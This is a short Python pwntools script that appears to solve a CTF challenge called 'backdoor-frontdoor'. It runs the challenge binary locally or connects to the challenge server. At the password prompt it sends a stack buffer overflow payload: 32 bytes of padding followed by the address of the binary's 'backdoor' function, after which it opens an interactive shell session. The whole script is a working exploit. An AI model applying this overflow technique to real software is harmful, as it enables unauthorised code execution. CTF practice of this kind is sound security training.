#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./main")


def start(argv=[], *a, **kw):
    host = args.HOST or 'backdoor-frontdoor.sibersiaga2023.myctf.io'
    port = int(args.PORT or 9998)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x1c + 0x4
win = elf.symbols["backdoor"]

payload = b"A" * pad
payload += p32(win)

io.sendlineafter(b"name : ", b"acbd")
io.sendlineafter(b"password: ", payload)

io.interactive()
